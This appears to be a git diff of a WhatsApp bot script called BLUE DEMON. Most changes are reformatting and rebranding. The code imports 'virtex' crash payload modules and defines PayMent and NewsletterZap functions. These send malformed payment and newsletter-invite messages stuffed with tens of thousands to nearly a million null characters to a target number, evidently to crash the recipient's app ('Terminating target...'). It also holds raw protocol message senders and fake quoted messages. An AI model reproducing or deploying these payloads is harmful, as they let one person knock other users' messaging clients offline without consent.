@@ -1,106 +1,128 @@
 /*
  CREATOR
- @rafztamvan
+ @DEMON KING
 */
 module.exports = async (zyn, m, store) => {
-try {
-const from = m.key.remoteJid
-const quoted = m.quoted ? m.quoted : m
-var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
-const budy = (typeof m.text == 'string' ? m.text : '')
-const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
-const isCmd = body.startsWith(prefix)
-const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
-const args = body.trim().split(/ +/).slice(1)
-const mime = (quoted.msg || quoted).mimetype || ''
-const text = q = args.join(" ")
-const isGroup = from.endsWith('@g.us')
-const botNumber = await zyn.decodeJid(zyn.user.id)
-const sender = m.key.fromMe ? (zyn.user.id.split(':')[0]+'@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
-const senderNumber = sender.split('@')[0]
-const pushname = m.pushName || `${senderNumber}`
-const isBot = botNumber.includes(senderNumber)
-const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
-const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
-const participants = isGroup ? await groupMetadata.participants : ''
-const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
-const groupOwner = isGroup ? groupMetadata.owner : ''
-const groupMembers = isGroup ? groupMetadata.participants : ''
-const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
-const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
-const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
-const totalFitur = () =>{
+    try {
+        const from = m.key.remoteJid
+        const quoted = m.quoted ? m.quoted : m
+        var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
+        const budy = (typeof m.text == 'string' ? m.text : '')
+        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
+        const isCmd = body.startsWith(prefix)
+        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+        const args = body.trim().split(/ +/).slice(1)
+        const mime = (quoted.msg || quoted).mimetype || ''
+        const axios = require('axios');
+        const text = q = args.join(" ")
+        const isGroup = from.endsWith('@g.us')
+        const botNumber = await zyn.decodeJid(zyn.user.id)
+        const sender = m.key.fromMe ? (zyn.user.id.split(':')[0] + '@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
+        const senderNumber = sender.split('@')[0]
+        const pushname = m.pushName || `${senderNumber}`
+        const isBot = botNumber.includes(senderNumber)
+        const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
+        const participants = isGroup ? await groupMetadata.participants : ''
+        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
+        const groupOwner = isGroup ? groupMetadata.owner : ''
+        const groupMembers = isGroup ? groupMetadata.participants : ''
+        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
+        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
+        const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
+        const totalFitur = () => {
             var mytext = fs.readFileSync("./demontech.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length;
             return numUpper
         }
-const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
-const { Client } = require('ssh2');
-const jsobfus = require('javascript-obfuscator');
-const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
-const { mediafireDl } = require('./database/dtbs/mediafire.js') 
-let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
-const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
-const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
-const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
-const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
-const botname = "𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍";
-const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
-const canvafy = require('canvafy')
- const currentMode = zyn.public ? 'Public' : 'Private';
-// VIRTEX
-		const {
-			ios
-		} = require("./database/virtex/ios.js")
-		const {
-			telapreta3
-		} = require("./database/virtex/telapreta3.js")
-		const {
-			convite
-		} = require("./database/virtex/convite.js")
-		const {
-			bugpdf
-		} = require("./database/virtex/bugpdf.js")
-		const {
-			cP
-		} = require('./database/virtex/bugUrl.js')
-	
-	
-// Auto Blocked Nomor +212
-if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
-// auto anti bug
-if (global.antibug) {
-if (!isGroup && m.isBaileys && m.fromMe) {
-await zyn.sendMessage(m.chat, {
-delete: {
-remoteJid: m.chat, fromMe: true, id: m.key.id
-}})
-await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*BUG MESSAGE DETECTED*
-*Number* ${m.sender.split("@")[0]}`}, {quoted: null})
-}}
-  const nanototalpitur = () => {
-            var mytext = fs.readFileSync("./bluexdemon.js").toString()
+        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+        const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
+        const {
+            Client
+        } = require('ssh2');
+        const jsobfus = require('javascript-obfuscator');
+        const {
+            addSaldo,
+            minSaldo,
+            cekSaldo
+        } = require("./database/dtbs/deposit");
+        const {
+            mediafireDl
+        } = require('./database/dtbs/mediafire.js')
+        let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
+        const {
+            beta1,
+            beta2,
+            buk1
+        } = require("./database/lib/hdr.js")
+        const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
+        const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`)
+        const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
+        const botname = "𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍";
+        const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
+        const canvafy = require('canvafy')
+        const currentMode = zyn.public ? 'Public' : 'Private';
+        // VIRTEX
+        const {
+            ios
+        } = require("./database/virtex/ios.js")
+        const {
+            telapreta3
+        } = require("./database/virtex/telapreta3.js")
+        const {
+            convite
+        } = require("./database/virtex/convite.js")
+        const {
+            bugpdf
+        } = require("./database/virtex/bugpdf.js")
+        const {
+            cP
+        } = require('./database/virtex/bugUrl.js')
+
+
+        // Auto Blocked Nomor +212
+        if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
+        // auto anti bug
+        if (global.antibug) {
+            if (!isGroup && m.isBaileys && m.fromMe) {
+                await zyn.sendMessage(m.chat, {
+                    delete: {
+                        remoteJid: m.chat,
+                        fromMe: true,
+                        id: m.key.id
+                    }
+                })
+                await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {
+                    text: `*BUG MESSAGE DETECTED*
+*Number* ${m.sender.split("@")[0]}`
+                }, {
+                    quoted: null
+                })
+            }
+        }
+        const nanototalpitur = () => {
+            var mytext = fs.readFileSync("./demontech.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
-const themeemoji = "🔪"
-// Random Color
-const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
-const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
-function runtime(seconds) {
+        const themeemoji = "👾"
+        // Random Color
+        const listcolor = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
+        const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
+
+        function runtime(seconds) {
             let hours = Math.floor(seconds / 3600);
             let minutes = Math.floor((seconds % 3600) / 60);
             let secondsLeft = Math.floor(seconds % 60);
 
             return `${hours} hrs,${minutes} mins,${secondsLeft} secs`;
         }
-let run = runtime(process.uptime())
-let runx = runtimex(process.uptime());
+        let run = runtime(process.uptime())
+        let runx = runtimex(process.uptime());
 
-// Command Yang Muncul Di Console
-if (isCmd) {
-console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `blue`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
+        // Command Yang Muncul Di Console
+        if (isCmd) {
+            console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `blue`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
         }
 
         // Days
@@ -111,184 +133,199 @@ console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴
 
         const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
         if (time2 < "23:59:00") {
-            var ucapanWaktu = 'wagwan 🏙️'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "19:00:00") {
-            var ucapanWaktu = 'wagwan  🌆'
+            var ucapanWaktu = 'wagwan  👾'
         }
         if (time2 < "18:00:00") {
-            var ucapanWaktu = 'wagwan  🌇'
+            var ucapanWaktu = 'wagwan  👾'
         }
         if (time2 < "15:00:00") {
-            var ucapanWaktu = 'wagwan 🌤️'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "10:00:00") {
-            var ucapanWaktu = 'wagwan 🌄'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "05:00:00") {
-            var ucapanWaktu = 'wagwan 🌆'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "03:00:00") {
-            var ucapanWaktu = 'wagwan  🌃'
+            var ucapanWaktu = 'wagwan  👾'
         }
-       
-    zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
-    let id = m.chat
-    if (id in zyn.autoshalat) {
-    return false
-    }
-    let jadwalSholat = {
-    shubuh: '04:29',
-    terbit: '05:44',
-    dhuha: '06:02',
-    dzuhur: '12:02',
-    ashar: '15:15',
-    magrib: '17:52',
-    isya: '19:01',
-    }
-    const datek = new Date((new Date).toLocaleString("en-US", {
-    timeZone: "Africa/Lagos"
-    }));
-    const hours = datek.getHours();
-    const minutes = datek.getMinutes();
-    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
-    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
-    if (timeNow === waktu) {
-        zyn.autoshalat[id] = [
-            zyn.sendMessage(m.chat, {
-audio: {
-    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
-},
-mimetype: 'audio/mp4',
-ptt: true,
-contextInfo: {
-    externalAdReply: {
-        showAdAttribution: true,
-        mediaType: 1,
-        mediaUrl: '',
-        title: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
-        body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🎧`,
-        sourceUrl: '',
-        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
-        renderLargerThumbnail: true
-    }
-}
-            }, {}),
-            setTimeout(async () => {
-delete client.autoshalat[m.chat]
-            }, 57000)
-        ]
-    }
-    }
 
-// Read Database
-const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
-const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
-const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
-
-// Cek Database
-const isContacts = contacts.includes(sender)
-const isPremium = prem.includes(sender)
-const isOwner = ownerNumber.includes(senderNumber) || isBot
-
-// BUTTON VIDEO
-   zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
-      var video = await prepareWAMessageMedia({
-         video: {
-            url: opts && opts.video ? opts.video : ''
-         }
-      }, {
-         upload: zyn.waUploadToServer
-      })
-      let message = generateWAMessageFromContent(jid, {
-         viewOnceMessage: {
-            message: {
-               interactiveMessage: {
-  body: {
-     text: opts && opts.body ? opts.body : ''
-  },
-  footer: {
-     text: opts && opts.footer ? opts.footer : ''
-  },
-  header: {
-     hasMediaAttachment: true,
-     videoMessage: video.videoMessage,
-  },
-  nativeFlowMessage: {
-     buttons: buttons,
-     messageParamsJson: ''
-  }, contextInfo: {
-      externalAdReply: {
-      title: global.namabot,
-      body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🩸`,
-      thumbnailUrl: global.imageurl,
-      sourceUrl: global.isLink,
-      mediaType: 1,
-      renderLargerThumbnail: true
-      }
-      }
-               
-               }
+        zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
+        let id = m.chat
+        if (id in zyn.autoshalat) {
+            return false
+        }
+        let jadwalSholat = {
+            shubuh: '04:29',
+            terbit: '05:44',
+            dhuha: '06:02',
+            dzuhur: '12:02',
+            ashar: '15:15',
+            magrib: '17:52',
+            isya: '19:01',
+        }
+        const datek = new Date((new Date).toLocaleString("en-US", {
+            timeZone: "Africa/Lagos"
+        }));
+        const hours = datek.getHours();
+        const minutes = datek.getMinutes();
+        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
+        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
+            if (timeNow === waktu) {
+                zyn.autoshalat[id] = [
+                    zyn.sendMessage(m.chat, {
+                        audio: {
+                            url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
+                        },
+                        mimetype: 'audio/mp4',
+                        ptt: true,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                mediaType: 1,
+                                mediaUrl: '',
+                                title: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
+                                body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🎧`,
+                                sourceUrl: '',
+                                thumbnail: await fs.readFileSync('./database/image/hmm.jpg'),
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {}),
+                    setTimeout(async () => {
+                        delete client.autoshalat[m.chat]
+                    }, 57000)
+                ]
             }
-         }
-      }, {
-         quoted
-      })
-      await zyn.sendPresenceUpdate('composing', jid)
-      return zyn.relayMessage(jid, message["message"], {
-         messageId: message.key.id
-      })
-   }
-		function runtimex(seconds) {
+        }
+
+        // Read Database
+        const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
+        const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
+        const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
+
+        // Cek Database
+        const isContacts = contacts.includes(sender)
+        const isPremium = prem.includes(sender)
+        const isOwner = ownerNumber.includes(senderNumber) || isBot
+        // BUTTON VIDEO
+        zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
+            var video = await prepareWAMessageMedia({
+                video: {
+                    url: opts && opts.video ? opts.video : ''
+                }
+            }, {
+                upload: zyn.waUploadToServer
+            })
+            let message = generateWAMessageFromContent(jid, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            body: {
+                                text: opts && opts.body ? opts.body : ''
+                            },
+                            footer: {
+                                text: opts && opts.footer ? opts.footer : ''
+                            },
+                            header: {
+                                hasMediaAttachment: true,
+                                videoMessage: video.videoMessage,
+                            },
+                            nativeFlowMessage: {
+                                buttons: buttons,
+                                messageParamsJson: ''
+                            },
+                            contextInfo: {
+                                externalAdReply: {
+                                    title: global.namabot,
+                                    body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🩸`,
+                                    thumbnailUrl: global.imageurl,
+                                    sourceUrl: global.isLink,
+                                    mediaType: 1,
+                                    renderLargerThumbnail: true
+                                }
+                            }
+
+                        }
+                    }
+                }
+            }, {
+                quoted
+            })
+            await zyn.sendPresenceUpdate('composing', jid)
+            return zyn.relayMessage(jid, message["message"], {
+                messageId: message.key.id
+            })
+        }
+
+        function runtimex(seconds) {
             let hours = Math.floor(seconds / 3600);
             let minutes = Math.floor((seconds % 3600) / 60);
             let secondsLeft = Math.floor(seconds % 60);
 
             return `*${hours}* 𝗛𝗼𝘂𝗿 *${minutes}* 𝗠𝗶𝗻𝘂𝘁𝗲 *${secondsLeft}* 𝗦𝗲𝗰𝗼𝗻𝗱𝘀`;
-        }    
-		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
-    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
-        'qp': {
-            'filter': {
-                'filterName': filterName,
-                'parameters': parameters,
-                'filterResult': filterResult,
-                'clientNotSupportedConfig': clientNotSupportedConfig
-            },
-            'filterClause': {
-                'clauseType': clauseType,
-                'clauses': clauses,
-                'filters': filters
-            }
         }
-    }), { userJid: target });
+        async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
+            var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
+                'qp': {
+                    'filter': {
+                        'filterName': filterName,
+                        'parameters': parameters,
+                        'filterResult': filterResult,
+                        'clientNotSupportedConfig': clientNotSupportedConfig
+                    },
+                    'filterClause': {
+                        'clauseType': clauseType,
+                        'clauses': clauses,
+                        'filters': filters
+                    }
+                }
+            }), {
+                userJid: target
+            });
 
-    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
-}
-		    
-		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
-    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
-        'sessionStructure': {
-            'sessionVersion': sessionVersion,
-            'localIdentityPublic': localIdentityPublic,
-            'remoteIdentityPublic': remoteIdentityPublic,
-            'rootKey': rootKey,
-            'previousCounter': previousCounter,
-            'senderChain': senderChain,
-            'receiverChains': receiverChains,
-            'pendingKeyExchange': pendingKeyExchange,
-            'pendingPreKey': pendingPreKey,
-            'remoteRegistrationId': remoteRegistrationId,
-            'localRegistrationId': localRegistrationId,
-            'needsRefresh': needsRefresh,
-            'aliceBaseKey': aliceBaseKey
+            await zyn.relayMessage(target, qpMessage.message, {
+                participant: {
+                    jid: target
+                },
+                messageId: qpMessage.key.id
+            });
         }
-    }), { userJid: target });
 
-    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
-}
-		
-const wanted = {
+        async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
+            var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
+                'sessionStructure': {
+                    'sessionVersion': sessionVersion,
+                    'localIdentityPublic': localIdentityPublic,
+                    'remoteIdentityPublic': remoteIdentityPublic,
+                    'rootKey': rootKey,
+                    'previousCounter': previousCounter,
+                    'senderChain': senderChain,
+                    'receiverChains': receiverChains,
+                    'pendingKeyExchange': pendingKeyExchange,
+                    'pendingPreKey': pendingPreKey,
+                    'remoteRegistrationId': remoteRegistrationId,
+                    'localRegistrationId': localRegistrationId,
+                    'needsRefresh': needsRefresh,
+                    'aliceBaseKey': aliceBaseKey
+                }
+            }), {
+                userJid: target
+            });
+
+            await zyn.relayMessage(target, sessionStructure.message, {
+                participant: {
+                    jid: target
+                },
+                messageId: sessionStructure.key.id
+            });
+        }
+
+        const wanted = {
             key: {
                 remoteJid: 'p',
                 fromMe: false,
@@ -307,110 +344,110 @@ const wanted = {
                     }
                 }
             }
-        }	
-		
-		
-		async function PayMent(LockJids) {
-			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
-				'viewOnceMessage': {
-					'message': {
-						'interactiveMessage': {
-							'header': {
-								"hasMediaAttachment": true,
-								'sequenceNumber': '0',
-								"jpegThumbnail": ""
-							},
-							'nativeFlowMessage': {
-								"buttons": [{
-									"name": "review_and_pay",
-									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-								}],
-								"messageParamsJson": '\0'.repeat(10000),
-							}
-						}
-					}
-				}
-			}), {});
-			zyn.relayMessage(LockJids, messageContent.message, {
-				'messageId': messageContent.key.id
-			});
-		}
+        }
 
-		async function NewsletterZap(LockJids) {
-			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
-				'viewOnceMessage': {
-					'message': {
-						"newsletterAdminInviteMessage": {
-							"newsletterJid": `120363298524333143@newsletter`,
-							"newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
-							"jpegThumbnail": "",
-							"caption": `Undangan Admin Channel Zynxzo Script`,
-							"inviteExpiration": Date.now() + 1814400000
-						}
-					}
-				}
-			}), {
-				'userJid': LockJids
-			});
-			await zyn.relayMessage(LockJids, messageContent.message, {
-				'participant': {
-					'jid': LockJids
-				},
-				'messageId': messageContent.key.id
-			});
-		}
 
-		const Porke = {
-			key: {
-				participant: `0@s.whatsapp.net`,
-				...(m.chat ? {
-					remoteJid: "status@broadcast"
-				} : {})
-			},
-			'message': {
-				"interactiveMessage": {
-					"header": {
-						"hasMediaAttachment": true,
-						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
-					},
-					"nativeFlowMessage": {
-						"buttons": [{
-							"name": "review_and_pay",
-							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-						}]
-					}
-				}
-			}
-		}
+        async function PayMent(LockJids) {
+            var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
+                'viewOnceMessage': {
+                    'message': {
+                        'interactiveMessage': {
+                            'header': {
+                                "hasMediaAttachment": true,
+                                'sequenceNumber': '0',
+                                "jpegThumbnail": ""
+                            },
+                            'nativeFlowMessage': {
+                                "buttons": [{
+                                    "name": "review_and_pay",
+                                    "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+                                }],
+                                "messageParamsJson": '\0'.repeat(10000),
+                            }
+                        }
+                    }
+                }
+            }), {});
+            zyn.relayMessage(LockJids, messageContent.message, {
+                'messageId': messageContent.key.id
+            });
+        }
 
-		const Porke2 = {
-			key: {
-				participant: `0@s.whatsapp.net`,
-				...(m.chat ? {
-					remoteJid: "status@broadcast"
-				} : {})
-			},
-			'message': {
-				"interactiveMessage": {
-					"header": {
-						"hasMediaAttachment": true,
-						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
-					},
-					"nativeFlowMessage": {
-						"buttons": [{
-							"name": "review_and_pay",
-							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-						}]
-					}
-				}
-			}
-		}
+        async function NewsletterZap(LockJids) {
+            var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
+                'viewOnceMessage': {
+                    'message': {
+                        "newsletterAdminInviteMessage": {
+                            "newsletterJid": `120363298524333143@newsletter`,
+                            "newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
+                            "jpegThumbnail": "",
+                            "caption": `Undangan Admin Channel Zynxzo Script`,
+                            "inviteExpiration": Date.now() + 1814400000
+                        }
+                    }
+                }
+            }), {
+                'userJid': LockJids
+            });
+            await zyn.relayMessage(LockJids, messageContent.message, {
+                'participant': {
+                    'jid': LockJids
+                },
+                'messageId': messageContent.key.id
+            });
+        }
 
-let list = []
-for (let i of ownerNumber) {
-list.push({
-displayName: await zyn.getName(i + '@s.whatsapp.net'),
-vcard: `BEGIN:VCARD\n
+        const Porke = {
+            key: {
+                participant: `0@s.whatsapp.net`,
+                ...(m.chat ? {
+                    remoteJid: "status@broadcast"
